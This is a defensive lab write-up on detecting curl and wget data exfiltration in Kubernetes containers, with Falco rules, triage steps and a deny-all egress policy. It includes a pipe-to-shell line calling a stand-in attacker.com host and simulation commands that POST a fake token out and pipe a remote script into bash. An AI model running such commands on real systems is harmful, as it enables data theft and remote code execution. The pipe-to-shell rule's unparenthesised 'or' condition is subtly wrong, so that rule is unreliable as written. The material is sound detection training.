---
title: "LAB-007: Data Exfiltration via curl or wget"
description: "A container runs curl or wget to send data to an external destination. Detect the exfiltration tool spawning — not just the network connection — and understand what to look for in the egress."
date: "2026-04-05"
mitre: "T1041 - Exfiltration Over C2 Channel"
mitre_url: "https://attack.mitre.org/techniques/T1041/"
severity: "high"
tags: ["Falco", "runtime detection", "exfiltration", "MITRE T1041", "curl", "wget", "container"]
github_path: "labs/lab-007-data-exfiltration"
---

## Threat scenario

An attacker has execution inside a container. They have read secrets, service account tokens, or application data. Now they need to get it out. They use `curl` or `wget` — tools commonly present in many container base images — to POST the data to an external server or to download additional tooling for the next stage.

This is also the pattern used by cryptominer droppers (LAB-003): download a binary, execute it, exfiltrate mining results. Detecting the tool spawn catches both patterns.

---

## Why this matters

`curl` and `wget` in production containers are a significant risk surface:

- They are present in most Ubuntu, Debian, and Alpine base images by default
- They can exfiltrate data over HTTPS, bypassing most payload-level network monitoring
- They can download and pipe to shell: `curl https://attacker.com/payload | bash` — a single command installs and executes malicious code
- Their presence in a production container is almost never necessary — application code uses language-level HTTP clients, not system tools

Detecting the process spawn (not just the network connection) means you catch it regardless of which port or protocol is used.

**MITRE ATT&CK:** [T1041 — Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)  
**Tactic:** Exfiltration  
**Severity:** High

---

## Attack simulation

```bash
# Deploy a test pod with curl installed
kubectl run lab007 --image=ubuntu:22.04 --restart=Never -- sleep 3600
kubectl wait --for=condition=ready pod/lab007
kubectl exec lab007 -- apt-get install -y curl wget -qq

# Simulate data exfiltration
kubectl exec lab007 -- curl -X POST https://httpbin.org/post \
  -d "data=supersecret&token=eyJhbGci..."

# Simulate tool download (dropper pattern)
kubectl exec lab007 -- wget -q https://example.com/tool -O /tmp/tool

# Simulate pipe-to-shell
kubectl exec lab007 -- bash -c "curl -s https://example.com/script | bash"
```

Expected result: Falco fires on the `curl` or `wget` process spawn with process name, command line arguments (which may contain the destination URL), and container identity.

---

## Falco detection rule

```yaml
- rule: Outbound Data Transfer Tool in Container
  desc: >
    curl, wget, or a similar data transfer tool was spawned inside a container.
    Production containers should use language-level HTTP clients, not system tools.
    This is a high-signal indicator of exfiltration or dropper activity.
  condition: >
    spawned_process and container and
    proc.name in (curl, wget, ftp, sftp) and
    not container.image.repository in (known_download_images) and
    not proc.pname in (package_mgmt_binaries)
  output: >
    Data transfer tool in container
    (user=%user.name proc=%proc.name cmdline=%proc.cmdline
     container=%container.name image=%container.image.repository
     k8s_ns=%k8s.ns.name k8s_pod=%k8s.pod.name)
  priority: HIGH
  tags: [container, exfiltration, T1041, data_transfer]

- rule: Pipe to Shell via Download Tool
  desc: >
    A download tool (curl, wget) was spawned and its output is being piped
    to a shell interpreter. This is the classic dropper pattern.
  condition: >
    spawned_process and container and
    proc.name in (curl, wget) and
    proc.cmdline contains "bash" or
    proc.cmdline contains "sh" or
    proc.cmdline contains "python"
  output: >
    Pipe-to-shell dropper pattern
    (user=%user.name proc=%proc.name cmdline=%proc.cmdline
     container=%container.name image=%container.image.repository
     k8s_ns=%k8s.ns.name k8s_pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, dropper, T1041, execution]
```

---

## Triage guide

When this alert fires:

1. **Check the command line** — the `proc.cmdline` field in the Falco output contains the full command including the destination URL. Is the destination a known internal service? An external IP or domain? A CDN that could mask the real destination?

2. **Check the image** — is `curl` or `wget` present in the production image intentionally? Most application containers do not need these tools. If they are present, it is an image hygiene problem regardless of this specific event.

3. **Check what was sent** — if the call was a POST with a body, check network flow logs or a service mesh for payload size. Large POST bodies from application containers are exfiltration candidates.

4. **Check what was downloaded** — if the call was a GET, check whether the downloaded content was written to disk (`/tmp`, `/var/tmp`) and whether any new process spawned from that path in the seconds after.

**Escalate if:** The destination is external and unknown, the command line contains pipe-to-shell patterns, or the downloaded content was subsequently executed.  
**Close if:** The curl call was from a known health check, a package manager update (correlate with `proc.pname`), or a startup script with a documented external dependency.

---

## Remediation

**Immediate:**
```bash
# If active exfiltration is suspected, block egress immediately
# Apply a deny-all NetworkPolicy to the namespace
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all-egress-emergency
  namespace: <affected-namespace>
spec:
  podSelector: {}
  policyTypes:
    - Egress
EOF
```

**Structural:**
- Remove `curl`, `wget`, and `ftp` from all production container images. Use distroless or minimal base images.
- Implement egress NetworkPolicies that restrict outbound traffic to only required internal services and approved external endpoints.
- The [Detection Starter Pack](/services/#detection-starter) includes this rule paired with egress anomaly detection and network policy recommendations for common application architectures.

---

## False positive notes

| Source | Pattern | Mitigation |
|--------|---------|------------|
| Package manager (apt, apk) | `apt-get` calls `curl` internally | Exclude via `proc.pname in (apt, apt-get, apk)` |
| Init containers | Download dependencies at startup | Replace with pre-built images; exception for specific init images |
| Health check endpoints | Some health checks use curl | Replace with proper probes; this should not be in production containers |
| Helm chart hooks | Some hooks download tools | Review hook design; use images with tools pre-installed |

---

## References

- [MITRE ATT&CK T1041](https://attack.mitre.org/techniques/T1041/)
- [Falco — Process-based detection](https://falco.org/docs/rules/)
- [Kubernetes NetworkPolicy — egress](https://kubernetes.io/docs/concepts/services-networking/network-policies/#egress)
- [ClarifyIntel Detection Starter Pack](/services/#detection-starter)
